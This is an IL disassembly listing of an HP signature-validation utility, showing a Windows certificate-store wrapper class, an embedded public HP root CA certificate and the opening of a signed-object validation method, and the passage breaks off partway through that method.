
//  Microsoft (R) .NET Framework IL Disassembler.  Version 3.5.30729.4916
//  Copyright (c) Microsoft Corporation.  All rights reserved.



// Metadata version: v4.0.30319
.module extern crypt32.dll
.module extern HP.Common.System.OS.dll
.assembly extern mscorlib
{
  .publickeytoken = (B7 7A 5C 56 19 34 E0 89 )                         // .z\V.4..
  .ver 4:0:0:0
}
.assembly extern System
{
  .publickeytoken = (B7 7A 5C 56 19 34 E0 89 )                         // .z\V.4..
  .ver 4:0:0:0
}
.assembly extern HP.Common.System
{
  .publickeytoken = (38 1B C9 03 A7 9D A9 11 )                         // 8.......
  .ver 1:0:0:0
}
.assembly extern HP.Platform.Framework
{
  .publickeytoken = (38 1B C9 03 A7 9D A9 11 )                         // 8.......
  .ver 1:0:0:0
}
.assembly HPValidateSignature
{
  .custom instance void [mscorlib]System.Runtime.CompilerServices.CompilationRelaxationsAttribute::.ctor(int32) = ( 01 00 08 00 00 00 00 00 ) 
  .custom instance void [mscorlib]System.Runtime.CompilerServices.RuntimeCompatibilityAttribute::.ctor() = ( 01 00 01 00 54 02 16 57 72 61 70 4E 6F 6E 45 78   // ....T..WrapNonEx
                                                                                                             63 65 70 74 69 6F 6E 54 68 72 6F 77 73 01 )       // ceptionThrows.

  // --- The following custom attribute is added automatically, do not uncomment -------
  //  .custom instance void [mscorlib]System.Diagnostics.DebuggableAttribute::.ctor(valuetype [mscorlib]System.Diagnostics.DebuggableAttribute/DebuggingModes) = ( 01 00 02 00 00 00 00 00 ) 

  .custom instance void [mscorlib]System.Reflection.AssemblyTitleAttribute::.ctor(string) = ( 01 00 13 48 50 56 61 6C 69 64 61 74 65 53 69 67   // ...HPValidateSig
                                                                                              6E 61 74 75 72 65 00 00 )                         // nature..
  .custom instance void [mscorlib]System.Reflection.AssemblyDescriptionAttribute::.ctor(string) = ( 01 00 00 00 00 ) 
  .custom instance void [mscorlib]System.Reflection.AssemblyConfigurationAttribute::.ctor(string) = ( 01 00 00 00 00 ) 
  .custom instance void [mscorlib]System.Reflection.AssemblyCompanyAttribute::.ctor(string) = ( 01 00 00 00 00 ) 
  .custom instance void [mscorlib]System.Reflection.AssemblyProductAttribute::.ctor(string) = ( 01 00 13 48 50 56 61 6C 69 64 61 74 65 53 69 67   // ...HPValidateSig
                                                                                                6E 61 74 75 72 65 00 00 )                         // nature..
  .custom instance void [mscorlib]System.Reflection.AssemblyCopyrightAttribute::.ctor(string) = ( 01 00 12 43 6F 70 79 72 69 67 68 74 20 C2 A9 20   // ...Copyright .. 
                                                                                                  20 32 30 31 37 00 00 )                            //  2017..
  .custom instance void [mscorlib]System.Reflection.AssemblyTrademarkAttribute::.ctor(string) = ( 01 00 00 00 00 ) 
  .custom instance void [mscorlib]System.Runtime.InteropServices.ComVisibleAttribute::.ctor(bool) = ( 01 00 00 00 00 ) 
  .custom instance void [mscorlib]System.Runtime.InteropServices.GuidAttribute::.ctor(string) = ( 01 00 24 65 39 33 39 33 38 30 37 2D 63 63 38 37   // ..$e9393807-cc87
                                                                                                  2D 34 36 37 66 2D 61 31 66 30 2D 62 31 62 65 64   // -467f-a1f0-b1bed
                                                                                                  66 39 37 62 39 38 61 00 00 )                      // f97b98a..
  .custom instance void [mscorlib]System.Runtime.Versioning.TargetFrameworkAttribute::.ctor(string) = ( 01 00 1C 2E 4E 45 54 46 72 61 6D 65 77 6F 72 6B   // ....NETFramework
                                                                                                        2C 56 65 72 73 69 6F 6E 3D 76 34 2E 35 2E 32 01   // ,Version=v4.5.2.
                                                                                                        00 54 0E 14 46 72 61 6D 65 77 6F 72 6B 44 69 73   // .T..FrameworkDis
                                                                                                        70 6C 61 79 4E 61 6D 65 14 2E 4E 45 54 20 46 72   // playName..NET Fr
                                                                                                        61 6D 65 77 6F 72 6B 20 34 2E 35 2E 32 )          // amework 4.5.2
  .hash algorithm 0x00008004
  .ver 1:0:0:0
}
.module HPValidateSignature.exe
// MVID: {B561AACA-D2AD-47BA-AA06-F6849D25DE79}
.imagebase 0x00400000
.file alignment 0x00000200
.stackreserve 0x00100000
.subsystem 0x0003       // WINDOWS_CUI
.corflags 0x00020003    //  ILONLY 32BITREQUIRED
// Image base: 0x0000000002370000


// =============== CLASS MEMBERS DECLARATION ===================

.class public auto ansi sealed beforefieldinit HPValidateSignature.HPX509Store
       extends [mscorlib]System.Object
       implements [mscorlib]System.IDisposable
{
  .field private native int mStoreHandle
  .field private valuetype [System]System.Security.Cryptography.X509Certificates.StoreName mStoreName
  .field private valuetype [System]System.Security.Cryptography.X509Certificates.StoreLocation mStoreLocation
  .method public hidebysig specialname instance valuetype [System]System.Security.Cryptography.X509Certificates.StoreName 
          get_StoreName() cil managed
  {
    // Code size       7 (0x7)
    .maxstack  8
    IL_0000:  ldarg.0
    IL_0001:  ldfld      valuetype [System]System.Security.Cryptography.X509Certificates.StoreName HPValidateSignature.HPX509Store::mStoreName
    IL_0006:  ret
  } // end of method HPX509Store::get_StoreName

  .method public hidebysig specialname instance valuetype [System]System.Security.Cryptography.X509Certificates.StoreLocation 
          get_StoreLocation() cil managed
  {
    // Code size       7 (0x7)
    .maxstack  8
    IL_0000:  ldarg.0
    IL_0001:  ldfld      valuetype [System]System.Security.Cryptography.X509Certificates.StoreLocation HPValidateSignature.HPX509Store::mStoreLocation
    IL_0006:  ret
  } // end of method HPX509Store::get_StoreLocation

  .method public hidebysig specialname instance class [System]System.Security.Cryptography.X509Certificates.X509Certificate2Collection 
          get_Certificates() cil managed
  {
    // Code size       38 (0x26)
    .maxstack  3
    .locals init ([0] class [System]System.Security.Cryptography.X509Certificates.X509Certificate2Collection certificates)
    IL_0000:  ldarg.0
    IL_0001:  ldfld      valuetype [System]System.Security.Cryptography.X509Certificates.StoreName HPValidateSignature.HPX509Store::mStoreName
    IL_0006:  ldarg.0
    IL_0007:  ldfld      valuetype [System]System.Security.Cryptography.X509Certificates.StoreLocation HPValidateSignature.HPX509Store::mStoreLocation
    IL_000c:  newobj     instance void [System]System.Security.Cryptography.X509Certificates.X509Store::.ctor(valuetype [System]System.Security.Cryptography.X509Certificates.StoreName,
                                                                                                              valuetype [System]System.Security.Cryptography.X509Certificates.StoreLocation)
    IL_0011:  dup
    IL_0012:  ldc.i4.0
    IL_0013:  callvirt   instance void [System]System.Security.Cryptography.X509Certificates.X509Store::Open(valuetype [System]System.Security.Cryptography.X509Certificates.OpenFlags)
    IL_0018:  dup
    IL_0019:  callvirt   instance class [System]System.Security.Cryptography.X509Certificates.X509Certificate2Collection [System]System.Security.Cryptography.X509Certificates.X509Store::get_Certificates()
    IL_001e:  stloc.0
    IL_001f:  callvirt   instance void [System]System.Security.Cryptography.X509Certificates.X509Store::Close()
    IL_0024:  ldloc.0
    IL_0025:  ret
  } // end of method HPX509Store::get_Certificates

  .method public hidebysig specialname rtspecialname 
          instance void  .ctor(valuetype [System]System.Security.Cryptography.X509Certificates.StoreName storeName,
                               valuetype [System]System.Security.Cryptography.X509Certificates.StoreLocation storeLocation) cil managed
  {
    // Code size       32 (0x20)
    .maxstack  8
    IL_0000:  ldarg.0
    IL_0001:  ldsfld     native int [mscorlib]System.IntPtr::Zero
    IL_0006:  stfld      native int HPValidateSignature.HPX509Store::mStoreHandle
    IL_000b:  ldarg.0
    IL_000c:  call       instance void [mscorlib]System.Object::.ctor()
    IL_0011:  ldarg.0
    IL_0012:  ldarg.1
    IL_0013:  stfld      valuetype [System]System.Security.Cryptography.X509Certificates.StoreName HPValidateSignature.HPX509Store::mStoreName
    IL_0018:  ldarg.0
    IL_0019:  ldarg.2
    IL_001a:  stfld      valuetype [System]System.Security.Cryptography.X509Certificates.StoreLocation HPValidateSignature.HPX509Store::mStoreLocation
    IL_001f:  ret
  } // end of method HPX509Store::.ctor

  .method family hidebysig virtual instance void 
          Finalize() cil managed
  {
    .override [mscorlib]System.Object::Finalize
    // Code size       16 (0x10)
    .maxstack  1
    .try
    {
      IL_0000:  ldarg.0
      IL_0001:  call       instance void HPValidateSignature.HPX509Store::ReleaseResources()
      IL_0006:  leave.s    IL_000f

    }  // end .try
    finally
    {
      IL_0008:  ldarg.0
      IL_0009:  call       instance void [mscorlib]System.Object::Finalize()
      IL_000e:  endfinally
    }  // end handler
    IL_000f:  ret
  } // end of method HPX509Store::Finalize

  .method public hidebysig newslot virtual final 
          instance void  Dispose() cil managed
  {
    // Code size       13 (0xd)
    .maxstack  8
    IL_0000:  ldarg.0
    IL_0001:  call       instance void HPValidateSignature.HPX509Store::ReleaseResources()
    IL_0006:  ldarg.0
    IL_0007:  call       void [mscorlib]System.GC::SuppressFinalize(object)
    IL_000c:  ret
  } // end of method HPX509Store::Dispose

  .method private hidebysig instance void 
          ReleaseResources() cil managed
  {
    // Code size       44 (0x2c)
    .maxstack  8
    IL_0000:  ldarg.0
    IL_0001:  ldfld      native int HPValidateSignature.HPX509Store::mStoreHandle
    IL_0006:  ldsfld     native int [mscorlib]System.IntPtr::Zero
    IL_000b:  call       bool [mscorlib]System.IntPtr::op_Inequality(native int,
                                                                     native int)
    IL_0010:  brtrue.s   IL_0013

    IL_0012:  ret

    IL_0013:  ldarg.0
    IL_0014:  ldfld      native int HPValidateSignature.HPX509Store::mStoreHandle
    IL_0019:  ldc.i4.0
    IL_001a:  call       bool HPValidateSignature.NativeMethods::CertCloseStore(native int,
                                                                                uint32)
    IL_001f:  pop
    IL_0020:  ldarg.0
    IL_0021:  ldsfld     native int [mscorlib]System.IntPtr::Zero
    IL_0026:  stfld      native int HPValidateSignature.HPX509Store::mStoreHandle
    IL_002b:  ret
  } // end of method HPX509Store::ReleaseResources

  .method public hidebysig instance void 
          Open(valuetype [System]System.Security.Cryptography.X509Certificates.OpenFlags mode) cil managed
  {
    // Code size       178 (0xb2)
    .maxstack  6
    .locals init ([0] uint32 num,
             [1] uint32 dwFlags,
             [2] string pvPara,
             [3] valuetype [System]System.Security.Cryptography.X509Certificates.StoreName V_3)
    IL_0000:  ldc.i4.0
    IL_0001:  stloc.0
    IL_0002:  ldarg.1
    IL_0003:  brtrue.s   IL_000d

    IL_0005:  ldloc.0
    IL_0006:  ldc.i4     0x8000
    IL_000b:  or
    IL_000c:  stloc.0
    IL_000d:  ldarg.0
    IL_000e:  ldfld      valuetype [System]System.Security.Cryptography.X509Certificates.StoreLocation HPValidateSignature.HPX509Store::mStoreLocation
    IL_0013:  ldc.i4.1
    IL_0014:  bne.un.s   IL_001f

    IL_0016:  ldloc.0
    IL_0017:  ldc.i4     0x10000
    IL_001c:  or
    IL_001d:  br.s       IL_0026

    IL_001f:  ldloc.0
    IL_0020:  ldc.i4     0x20000
    IL_0025:  or
    IL_0026:  stloc.1
    IL_0027:  ldstr      ""
    IL_002c:  stloc.2
    IL_002d:  ldarg.0
    IL_002e:  ldfld      valuetype [System]System.Security.Cryptography.X509Certificates.StoreName HPValidateSignature.HPX509Store::mStoreName
    IL_0033:  stloc.3
    IL_0034:  ldloc.3
    IL_0035:  ldc.i4.3
    IL_0036:  sub
    IL_0037:  switch     ( 
                          IL_004e,
                          IL_0064,
                          IL_0056,
                          IL_005e)
    IL_004c:  br.s       IL_0064

    IL_004e:  ldstr      "CA"
    IL_0053:  stloc.2
    IL_0054:  br.s       IL_0064

    IL_0056:  ldstr      "MY"
    IL_005b:  stloc.2
    IL_005c:  br.s       IL_0064

    IL_005e:  ldstr      "ROOT"
    IL_0063:  stloc.2
    IL_0064:  ldarg.0
    IL_0065:  call       instance void HPValidateSignature.HPX509Store::ReleaseResources()
    IL_006a:  ldarg.0
    IL_006b:  ldc.i4.s   10
    IL_006d:  conv.i8
    IL_006e:  call       native int [mscorlib]System.IntPtr::op_Explicit(int64)
    IL_0073:  ldc.i4.0
    IL_0074:  ldsfld     native int [mscorlib]System.IntPtr::Zero
    IL_0079:  ldloc.1
    IL_007a:  ldloc.2
    IL_007b:  call       native int HPValidateSignature.NativeMethods::CertOpenStore(native int,
                                                                                     uint32,
                                                                                     native int,
                                                                                     uint32,
                                                                                     string)
    IL_0080:  stfld      native int HPValidateSignature.HPX509Store::mStoreHandle
    IL_0085:  ldarg.0
    IL_0086:  ldfld      native int HPValidateSignature.HPX509Store::mStoreHandle
    IL_008b:  ldsfld     native int [mscorlib]System.IntPtr::Zero
    IL_0090:  call       bool [mscorlib]System.IntPtr::op_Equality(native int,
                                                                   native int)
    IL_0095:  brfalse.s  IL_00b1

    IL_0097:  ldstr      "open store error "
    IL_009c:  call       int32 [mscorlib]System.Runtime.InteropServices.Marshal::GetLastWin32Error()
    IL_00a1:  box        [mscorlib]System.Int32
    IL_00a6:  call       string [mscorlib]System.String::Concat(object,
                                                                object)
    IL_00ab:  newobj     instance void [mscorlib]System.InvalidOperationException::.ctor(string)
    IL_00b0:  throw

    IL_00b1:  ret
  } // end of method HPX509Store::Open

  .method public hidebysig instance void 
          Close() cil managed
  {
    // Code size       7 (0x7)
    .maxstack  8
    IL_0000:  ldarg.0
    IL_0001:  call       instance void HPValidateSignature.HPX509Store::Dispose()
    IL_0006:  ret
  } // end of method HPX509Store::Close

  .method public hidebysig instance void 
          Add(class [System]System.Security.Cryptography.X509Certificates.X509Certificate2 certificate) cil managed
  {
    // Code size       58 (0x3a)
    .maxstack  6
    .locals init ([0] uint8[] rawCertData)
    IL_0000:  ldarg.1
    IL_0001:  callvirt   instance uint8[] [mscorlib]System.Security.Cryptography.X509Certificates.X509Certificate::GetRawCertData()
    IL_0006:  stloc.0
    IL_0007:  ldarg.0
    IL_0008:  ldfld      native int HPValidateSignature.HPX509Store::mStoreHandle
    IL_000d:  ldc.i4.1
    IL_000e:  ldloc.0
    IL_000f:  ldloc.0
    IL_0010:  ldlen
    IL_0011:  conv.i4
    IL_0012:  ldc.i4.3
    IL_0013:  ldsfld     native int [mscorlib]System.IntPtr::Zero
    IL_0018:  call       bool HPValidateSignature.NativeMethods::CertAddEncodedCertificateToStore(native int,
                                                                                                  uint32,
                                                                                                  uint8[],
                                                                                                  uint32,
                                                                                                  uint32,
                                                                                                  native int)
    IL_001d:  brtrue.s   IL_0039

    IL_001f:  ldstr      "add certificate error "
    IL_0024:  call       int32 [mscorlib]System.Runtime.InteropServices.Marshal::GetLastWin32Error()
    IL_0029:  box        [mscorlib]System.Int32
    IL_002e:  call       string [mscorlib]System.String::Concat(object,
                                                                object)
    IL_0033:  newobj     instance void [mscorlib]System.ArgumentException::.ctor(string)
    IL_0038:  throw

    IL_0039:  ret
  } // end of method HPX509Store::Add

  .method public hidebysig instance void 
          Remove(class [mscorlib]System.Security.Cryptography.X509Certificates.X509Certificate certificate) cil managed
  {
    // Code size       112 (0x70)
    .maxstack  4
    .locals init ([0] uint8[] certHash,
             [1] native int num,
             [2] uint8[] pvData,
             [3] uint32 length,
             [4] int32 index)
    IL_0000:  ldarg.1
    IL_0001:  callvirt   instance uint8[] [mscorlib]System.Security.Cryptography.X509Certificates.X509Certificate::GetCertHash()
    IL_0006:  stloc.0
    IL_0007:  ldsfld     native int [mscorlib]System.IntPtr::Zero
    IL_000c:  stloc.1
    IL_000d:  ldc.i4.s   20
    IL_000f:  newarr     [mscorlib]System.Byte
    IL_0014:  stloc.2
    IL_0015:  br.s       IL_0055

    IL_0017:  ldloc.2
    IL_0018:  ldlen
    IL_0019:  conv.i4
    IL_001a:  stloc.3
    IL_001b:  ldloc.1
    IL_001c:  ldc.i4.3
    IL_001d:  ldloc.2
    IL_001e:  ldloca.s   length
    IL_0020:  call       bool HPValidateSignature.NativeMethods::CertGetCertificateContextProperty(native int,
                                                                                                   uint32,
                                                                                                   uint8[],
                                                                                                   uint32&)
    IL_0025:  pop
    IL_0026:  ldc.i4.0
    IL_0027:  stloc.s    index
    IL_0029:  br.s       IL_0031

    IL_002b:  ldloc.s    index
    IL_002d:  ldc.i4.1
    IL_002e:  add
    IL_002f:  stloc.s    index
    IL_0031:  ldloc.s    index
    IL_0033:  conv.i8
    IL_0034:  ldloc.3
    IL_0035:  conv.u8
    IL_0036:  bge.s      IL_0042

    IL_0038:  ldloc.0
    IL_0039:  ldloc.s    index
    IL_003b:  ldelem.u1
    IL_003c:  ldloc.2
    IL_003d:  ldloc.s    index
    IL_003f:  ldelem.u1
    IL_0040:  beq.s      IL_002b

    IL_0042:  ldloc.s    index
    IL_0044:  conv.i8
    IL_0045:  ldloc.3
    IL_0046:  conv.u8
    IL_0047:  bne.un.s   IL_0055

    IL_0049:  ldloc.1
    IL_004a:  call       native int HPValidateSignature.NativeMethods::CertDuplicateCertificateContext(native int)
    IL_004f:  call       bool HPValidateSignature.NativeMethods::CertDeleteCertificateFromStore(native int)
    IL_0054:  pop
    IL_0055:  ldarg.0
    IL_0056:  ldfld      native int HPValidateSignature.HPX509Store::mStoreHandle
    IL_005b:  ldloc.1
    IL_005c:  call       native int HPValidateSignature.NativeMethods::CertEnumCertificatesInStore(native int,
                                                                                                   native int)
    IL_0061:  dup
    IL_0062:  stloc.1
    IL_0063:  ldsfld     native int [mscorlib]System.IntPtr::Zero
    IL_0068:  call       bool [mscorlib]System.IntPtr::op_Inequality(native int,
                                                                     native int)
    IL_006d:  brtrue.s   IL_0017

    IL_006f:  ret
  } // end of method HPX509Store::Remove

  .property instance valuetype [System]System.Security.Cryptography.X509Certificates.StoreName
          StoreName()
  {
    .get instance valuetype [System]System.Security.Cryptography.X509Certificates.StoreName HPValidateSignature.HPX509Store::get_StoreName()
  } // end of property HPX509Store::StoreName
  .property instance valuetype [System]System.Security.Cryptography.X509Certificates.StoreLocation
          StoreLocation()
  {
    .get instance valuetype [System]System.Security.Cryptography.X509Certificates.StoreLocation HPValidateSignature.HPX509Store::get_StoreLocation()
  } // end of property HPX509Store::StoreLocation
  .property instance class [System]System.Security.Cryptography.X509Certificates.X509Certificate2Collection
          Certificates()
  {
    .get instance class [System]System.Security.Cryptography.X509Certificates.X509Certificate2Collection HPValidateSignature.HPX509Store::get_Certificates()
  } // end of property HPX509Store::Certificates
} // end of class HPValidateSignature.HPX509Store

.class public auto ansi sealed beforefieldinit HPValidateSignature.SignedObjectAsn
       extends [mscorlib]System.Object
       implements [mscorlib]System.IDisposable
{
  .field private uint8[] signedDataOid
  .field private uint8[] sha1Oid
  .field private uint8[] sha256Oid
  .field private uint8[] md5Oid
  .field private static literal string ThirdPartyRootCA = "-----BEGIN CERTIFICATE-----MIIDrDCCApSgAwIBAgIQM2O"
  + "00UXfpQityCo2+LaytDANBgkqhkiG9w0BAQUFADBw\nMQswCQYDVQQGEwJVUzEgMB4GA1UEChMXSGV3bGV0dC1QYWNrYXJkIENvbXBhbnkx"
  + "\nPzA9BgNVBAMTNkhld2xldHQtUGFja2FyZCBQcmludGluZyBEZXZpY2UgSW5mcmFz\ndHJ1Y3R1cmUgUm9vdCBDQTAeFw0wNTA1MjQwMDAw"
  + "MDBaFw0zODAxMDEyMzU5NTla\nMHAxCzAJBgNVBAYTAlVTMSAwHgYDVQQKExdIZXdsZXR0LVBhY2thcmQgQ29tcGFu\neTE/MD0GA1UEAxM2"
  + "SGV3bGV0dC1QYWNrYXJkIFByaW50aW5nIERldmljZSBJbmZy\nYXN0cnVjdHVyZSBSb290IENBMIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AM"
  + "IIBCgKC\nAQEAoT+gCaPVpaL3pZhIzso7zBiUxEldsASpXzfgUQdguxJsNVIoqNOQ3IUefmUf\ndfmYrf0ksh0bBNwVp7JlP/vtK01EbXefR"
  + "HVRPwVIjYqmMPrOUjfVAam8SrOnA3rw\nVxyBJRedg2+gnwkZQ4prPKkMcnyd1p1/86SQPsLGJJx9zRleZ7Ix5QKJAGeH1ED0\n89E7uJYbO"
  + "sd1XclsdunlNByrG9Z9b2/l95YaF3GLSiB4g82/flfEw7lZOtjBMHiL\nEl0BUTRMuaSherT5KDW5mApE4R82UvnPNTyVz2yb7DTU+MBc4W"
  + "RClV/wtj2GkVaA\nvt1KyUODNujmkMAtI565aJFgrQIDAQABo0IwQDASBgNVHRMBAf8ECDAGAQH/AgEB\nMAsGA1UdDwQEAwIBBjAdBgNVHQ"
  + "4EFgQUjPJcdcgMB+Kxa9uR0J3xCg9pdp4wDQYJ\nKoZIhvcNAQEFBQADggEBAEu1SPC8j53+eHkh9uYrj+38+Zl7sd0dLxOZdQ+cQs67\nah"
  + "OKYcXU9kBAnKDNIfIXP1tnMbBTxCSG2WCum42cbrdvg1FxeQkY/bRyiDZgijGm\nEAsXCqGd1HJzCbLIjcTbqzXBjUWulj0KP743GgjTGw1"
  + "+Le8B+V7/8nscFsdxXdas\nff6/fWXYWuiKtJq21mFq9+5fJNP6ynADccoq3h97icwf6c79TQ/Kl9+XFiv8KJfK\nZF4pY0jRYytcZ/VaiMS"
  + "E58IhbCMN/TyHoGGiZL5j1AqRFIogL3SRfopDtYfmuYf+\nQBZnAFq20BlsBWDioLeN3S/l6zOLxOkoHuWibN6Wg8A=\n-----END CERTIF"
  + "ICATE-----"
  .field private static literal string sha256OidName = "2.16.840.1.101.3.4.2.1"
  .field private native int memCertStore
  .field private native int signerCert
  .field private class [System]System.Security.Cryptography.X509Certificates.X509Certificate2 rootCert
  .field private class [System]System.Security.Cryptography.X509Certificates.X509Certificate2 sigCert
  .field private valuetype [mscorlib]System.DateTime notAfter
  .field private valuetype [mscorlib]System.DateTime notBefore
  .field private class [HP.Common.System]HP.Common.System.Security.SignedDataIndex sdIndex
  .field private class [System]System.Security.Cryptography.X509Certificates.X509Certificate2Collection certCollection
  .method public hidebysig specialname rtspecialname 
          instance void  .ctor() cil managed
  {
    // Code size       134 (0x86)
    .maxstack  4
    IL_0000:  ldarg.0
    IL_0001:  ldc.i4.s   9
    IL_0003:  newarr     [mscorlib]System.Byte
    IL_0008:  dup
    IL_0009:  ldtoken    field valuetype '<PrivateImplementationDetails>'/'__StaticArrayInitTypeSize=9' '<PrivateImplementationDetails>'::'1A39764B112685485A5BA7B2880D878B858C1A7A'
    IL_000e:  call       void [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::InitializeArray(class [mscorlib]System.Array,
                                                                                                        valuetype [mscorlib]System.RuntimeFieldHandle)
    IL_0013:  stfld      uint8[] HPValidateSignature.SignedObjectAsn::signedDataOid
    IL_0018:  ldarg.0
    IL_0019:  ldc.i4.5
    IL_001a:  newarr     [mscorlib]System.Byte
    IL_001f:  dup
    IL_0020:  ldtoken    field valuetype '<PrivateImplementationDetails>'/'__StaticArrayInitTypeSize=5' '<PrivateImplementationDetails>'::'9E3E23A6EADD13E71A891894CBBF817811C47B33'
    IL_0025:  call       void [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::InitializeArray(class [mscorlib]System.Array,
                                                                                                        valuetype [mscorlib]System.RuntimeFieldHandle)
    IL_002a:  stfld      uint8[] HPValidateSignature.SignedObjectAsn::sha1Oid
    IL_002f:  ldarg.0
    IL_0030:  ldc.i4.s   9
    IL_0032:  newarr     [mscorlib]System.Byte
    IL_0037:  dup
    IL_0038:  ldtoken    field valuetype '<PrivateImplementationDetails>'/'__StaticArrayInitTypeSize=9' '<PrivateImplementationDetails>'::'727B1D2687E7034906AD71DCF56066D1228B85DE'
    IL_003d:  call       void [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::InitializeArray(class [mscorlib]System.Array,
                                                                                                        valuetype [mscorlib]System.RuntimeFieldHandle)
    IL_0042:  stfld      uint8[] HPValidateSignature.SignedObjectAsn::sha256Oid
    IL_0047:  ldarg.0
    IL_0048:  ldc.i4.8
    IL_0049:  newarr     [mscorlib]System.Byte
    IL_004e:  dup
    IL_004f:  ldtoken    field int64 '<PrivateImplementationDetails>'::'5D4E64280317F7B034DACEC722CBA3313FF30357'
    IL_0054:  call       void [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::InitializeArray(class [mscorlib]System.Array,
                                                                                                        valuetype [mscorlib]System.RuntimeFieldHandle)
    IL_0059:  stfld      uint8[] HPValidateSignature.SignedObjectAsn::md5Oid
    IL_005e:  ldarg.0
    IL_005f:  call       instance void [mscorlib]System.Object::.ctor()
    IL_0064:  ldarg.0
    IL_0065:  ldsfld     native int [mscorlib]System.IntPtr::Zero
    IL_006a:  stfld      native int HPValidateSignature.SignedObjectAsn::memCertStore
    IL_006f:  ldarg.0
    IL_0070:  ldsfld     native int [mscorlib]System.IntPtr::Zero
    IL_0075:  stfld      native int HPValidateSignature.SignedObjectAsn::signerCert
    IL_007a:  ldarg.0
    IL_007b:  newobj     instance void [System]System.Security.Cryptography.X509Certificates.X509Certificate2Collection::.ctor()
    IL_0080:  stfld      class [System]System.Security.Cryptography.X509Certificates.X509Certificate2Collection HPValidateSignature.SignedObjectAsn::certCollection
    IL_0085:  ret
  } // end of method SignedObjectAsn::.ctor

  .method family hidebysig virtual instance void 
          Finalize() cil managed
  {
    .override [mscorlib]System.Object::Finalize
    // Code size       37 (0x25)
    .maxstack  2
    .try
    {
      IL_0000:  ldc.i4     0xc002ea
      IL_0005:  call       void [HP.Platform.Framework]HP.Common.System.Diagnostics.SysTrace::_WriteEvent(uint32)
      IL_000a:  ldarg.0
      IL_000b:  ldc.i4.0
      IL_000c:  call       instance void HPValidateSignature.SignedObjectAsn::Dispose(bool)
      IL_0011:  ldc.i4     0xc002eb
      IL_0016:  call       void [HP.Platform.Framework]HP.Common.System.Diagnostics.SysTrace::_WriteEvent(uint32)
      IL_001b:  leave.s    IL_0024

    }  // end .try
    finally
    {
      IL_001d:  ldarg.0
      IL_001e:  call       instance void [mscorlib]System.Object::Finalize()
      IL_0023:  endfinally
    }  // end handler
    IL_0024:  ret
  } // end of method SignedObjectAsn::Finalize

  .method public hidebysig newslot virtual final 
          instance void  Dispose() cil managed
  {
    // Code size       14 (0xe)
    .maxstack  8
    IL_0000:  ldarg.0
    IL_0001:  ldc.i4.1
    IL_0002:  call       instance void HPValidateSignature.SignedObjectAsn::Dispose(bool)
    IL_0007:  ldarg.0
    IL_0008:  call       void [mscorlib]System.GC::SuppressFinalize(object)
    IL_000d:  ret
  } // end of method SignedObjectAsn::Dispose

  .method private hidebysig instance void 
          Dispose(bool disposing) cil managed
  {
    // Code size       86 (0x56)
    .maxstack  2
    IL_0000:  ldarg.0
    IL_0001:  ldfld      native int HPValidateSignature.SignedObjectAsn::signerCert
    IL_0006:  ldsfld     native int [mscorlib]System.IntPtr::Zero
    IL_000b:  call       bool [mscorlib]System.IntPtr::op_Inequality(native int,
                                                                     native int)
    IL_0010:  brfalse.s  IL_0029

    IL_0012:  ldarg.0
    IL_0013:  ldfld      native int HPValidateSignature.SignedObjectAsn::signerCert
    IL_0018:  call       bool HPValidateSignature.NativeMethods::CertFreeCertificateContext(native int)
    IL_001d:  pop
    IL_001e:  ldarg.0
    IL_001f:  ldsfld     native int [mscorlib]System.IntPtr::Zero
    IL_0024:  stfld      native int HPValidateSignature.SignedObjectAsn::signerCert
    IL_0029:  ldarg.0
    IL_002a:  ldfld      native int HPValidateSignature.SignedObjectAsn::memCertStore
    IL_002f:  ldsfld     native int [mscorlib]System.IntPtr::Zero
    IL_0034:  call       bool [mscorlib]System.IntPtr::op_Inequality(native int,
                                                                     native int)
    IL_0039:  brfalse.s  IL_0053

    IL_003b:  ldarg.0
    IL_003c:  ldfld      native int HPValidateSignature.SignedObjectAsn::memCertStore
    IL_0041:  ldc.i4.0
    IL_0042:  call       bool HPValidateSignature.NativeMethods::CertCloseStore(native int,
                                                                                uint32)
    IL_0047:  pop
    IL_0048:  ldarg.0
    IL_0049:  ldsfld     native int [mscorlib]System.IntPtr::Zero
    IL_004e:  stfld      native int HPValidateSignature.SignedObjectAsn::memCertStore
    IL_0053:  ldarg.1
    IL_0054:  pop
    IL_0055:  ret
  } // end of method SignedObjectAsn::Dispose

  .method private hidebysig instance void 
          CleanUp() cil managed
  {
    // Code size       28 (0x1c)
    .maxstack  8
    IL_0000:  ldarg.0
    IL_0001:  ldc.i4.1
    IL_0002:  call       instance void HPValidateSignature.SignedObjectAsn::Dispose(bool)
    IL_0007:  ldarg.0
    IL_0008:  ldfld      class [System]System.Security.Cryptography.X509Certificates.X509Certificate2Collection HPValidateSignature.SignedObjectAsn::certCollection
    IL_000d:  brtrue.s   IL_0010

    IL_000f:  ret

    IL_0010:  ldarg.0
    IL_0011:  ldfld      class [System]System.Security.Cryptography.X509Certificates.X509Certificate2Collection HPValidateSignature.SignedObjectAsn::certCollection
    IL_0016:  callvirt   instance void [mscorlib]System.Collections.CollectionBase::Clear()
    IL_001b:  ret
  } // end of method SignedObjectAsn::CleanUp

  .method public hidebysig instance valuetype [HP.Common.System]HP.Common.System.Security.SignedObjRet 
          ValidateSignature(uint8[] signedObj,
                            class [mscorlib]System.Security.Cryptography.HashAlgorithm preHash,
                            class [HP.Common.System]HP.Common.System.Security.SignedDataIndex inIndex) cil managed
  {
    // Code size       662 (0x296)
    .maxstack  5
    .locals init ([0] uint8[] numArray1,
             [1] int64 certListLen,
             [2] int64 certListData,
             [3] valuetype [mscorlib]System.Security.Cryptography.RSAParameters rsa,
             [4] class [System]System.Security.Cryptography.X509Certificates.X509Certificate2 certificate,
             [5] uint32 num2,
             [6] bool timeCheck,
             [7] int64 length,
             [8] uint8[] cert,
             [9] class [mscorlib]System.Security.Cryptography.RSACryptoServiceProvider rsaManaged,
             [10] uint8[] authenticodeSigHash,
             [11] uint8[] numArray2,
             [12] string str,
             [13] valuetype [HP.Common.System]HP.Common.System.Security.SignedObjRet V_13,
             [14] class HPValidateSignature.HPX509Store hpX509Store)
    IL_0000:  ldarg.1
    IL_0001:  ldlen
    IL_0002:  brtrue.s   IL_0006

    IL_0004:  ldc.i4.m1
    IL_0005:  ret

    IL_0006:  ldarg.3
    IL_0007:  brtrue.s   IL_0024

    IL_0009:  ldarg.0
    IL_000a:  ldarg.1
